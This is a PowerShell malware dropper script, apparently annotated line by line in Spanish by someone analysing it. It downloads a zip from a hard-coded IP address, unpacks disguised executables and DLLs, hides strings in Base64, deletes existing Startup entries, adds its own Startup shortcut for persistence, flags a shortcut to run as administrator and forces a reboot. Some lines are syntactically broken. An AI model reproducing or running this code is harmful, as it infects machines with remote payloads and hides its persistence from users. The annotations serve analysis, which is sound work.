Function fun_random 
{
	$letras = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
	## Crea una lista de letras
	$numeros = "2_","3_","4_","5_","6_","7_","8_","9_"
	## Crea una lista de números
	$limpiar = $null    										 					
	## valor null sirve para liberar el espacio en memoria que estaba usando la variable
	$contar_6 = Get-Random -InputObject $letras -Count 6   					
	## toma letras dinamicas de un rango de 6 letras.
	$contar_1 = Get-Random -InputObject $numeros -Count 1    					
	## toma numeros dinamicos func_2vbs_str1 de un rango de 1 numero.
	$letraMayuscula = Get-Random -InputObject $letras.ToUpper() -Count 1    
	## Convierte la letra en mayuscula
	
	foreach($n in $contar_6) 
	{
		$limpiar += $n
	}
	
	foreach ($n2 in $contar_1) 
	{
		$limpiar += $n2
	}

	foreach ($n3 in $letraMayuscula) 
	{
		$limpiar += $n3
	}

	return "Java_$limpiar"
}
## la funcion genera un nombre de archivo algo parecido a Java_pyqjkz2_Z
## 6 letras como el count 6
## 1 número como el count 1
## Asignar una letra en mayusculo como en abcdarioa_contar

$var_fun_random = fun_random  
## asigna el valor que saca la función a una variable
$validando_path_idat = if (c:\users\i.dat) { Test-Path c:\users\i.dat }
## valida si la direeción es c:\users\public\i.dat
$validando_path_idat
## muestra el valor True o False

if($validando_path_idat -eq 'True')
{
     exit
} 
else 
{
	New-Item -ItemType directory -Path c:\users\$var_fun_random
	## crea un directorio con el nombre obtenido en la funcion random
	$web = new-object System.Net.WebClient
	$web.DownloadFile(http://137.74.162.25/M1106/kk/md.zip,"c:\users\$var_fun_random\$var_fun_random.zip")
	## descarga un archivo de la url que se muetra al inicio dentro del directorio que crea y le asigna el mismonombre con .zip al final
	$shell_app = new-object -com shell.application 
	$var10 = $shell_app.namespace("c:\users\$var_fun_random\$var_fun_random.zip") 
	$var11 = $shell_app.namespace("c:\users\$var_fun_random") 
	$var11.Copyhere($var10.items())
	## crear una aplicacion de consola, "descomprime los archivos" y los copia al directorio
	Rename-Item -NewName ("c:\users\$var_fun_random\$var_fun_random.exe") -Path ("c:\users\$var_fun_random\exe.png")
	Rename-Item -NewName ("c:\users\$var_fun_random\$var_fun_random.LNS") -Path ("c:\users\$var_fun_random\12.dll")
	Rename-Item -NewName ("c:\users\$var_fun_random\sqlite3.dll") -Path ("c:\users\$var_fun_random\sql.png")
    ## Renombra los archivos a sus extensiones correctas
	function func_2
	{
  		Param([string]$func_2_string1,[string]$func_2_string2);
  	try
	{  
    	$wscript_shell = New-Object -ComObject WScript.Shell 
		$shortcut = $wscript_shell.CreateShortcut($func_2_string1) 
    	$shortcut.TargetPath = "c:\users\$var_fun_random\$var_fun_random.exe"       
    	$shortcut.Arguments = " $var_fun_random1.LNS  $var_fun_random"
    	$shortcut.WorkingDirectory = "c:\users\$var_fun_random" 
    	$shortcut.WindowStyle = 7   
    	$shortcut.IconLocation = %ProgramFiles%\Internet Explorer\iexplore.exe,1
        ## crear un acceso director en el escritorio que es del exe de ie %ProgramFiles%\Internet Explorer\iexplore.exe,1
    	$shortcut.Save()
  	}
	
	finally{}
	}
	
	$wscript_shell2 = New-Object -Com WScript.Shell
	$startup = $wscript_shell2.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));  
    ## startup       
	del $startup\*.vbs
	del $startup\*.lnk
	$var12 = "$env:APPDATA\$env1, $env2"
	$var13 = "$startup\$var_fun_random.lnk"  
        
	func_2 $var13  $var12

	func_2 "c:\users\public\c.lnk"   $var12
	$bytes = [System.IO.File]::ReadAllBytes("c:\users\public\c.lnk")
	$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
	[System.IO.File]::WriteAllBytes("c:\users\public\c.lnk", $bytes)
	function func_2vbs
	{
  		Param([string]$func_2vbs_str1,[string]$func_2vbs_str2);
	try
	{  
		$var14 = New-Object -ComObject WScript.Shell 
    	$var15 = $var14.CreateShortcut($func_2vbs_str1) 
    	$var15.TargetPath = "c:\users\public\$var_fun_random.vbs"      
    	$var15.Arguments = ""
		$var15.Description = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AGUAcgBuAGUAdAAuACIA')));
        ##"Acessar a internet."
    	$var15.WorkingDirectory = ""    
    	$var15.IconLocation = "$var21"
    	$var15.Save()
  	}
	finally{}
}

$var16 = $var_fun_random
$var16 | Set-Content "c:\users\i.dat"
$var16 | Out-File "c:\users\i.dat"
$var16 > "c:\users\i.dat"

$var13 = "c:\users\public\chrome.lnk" 
func_2vbs $var13  $func_2vbs_str2

$var17 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AZQA=')))
## Line
$var18 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBtAGQA')))
## Cmd
$var19 = '86'
$var20 = "$"
$Arquivo = "c:\users\$var_fun_random\$var_fun_random1.LNS"

$ArquivoSaida ="c:\users\$var_fun_random\$var_fun_random1.LNS"
Add-Content $Arquivo '#NoTrayIcon'
Add-Content $Arquivo "Global $var20$var_fun_random = $var20$var18$var17[1]"
Add-Content $Arquivo "Global $var20$var_fun_random$var19 = DllOpen('$var_fun_random.LNS')"
Add-Content $Arquivo "DllCall($var20$var_fun_random$var19, 'STRUCT', 'JLI_CmdToArgs')"


C:\WINDOWS\system32\shutdown.exe -r -t 200

}
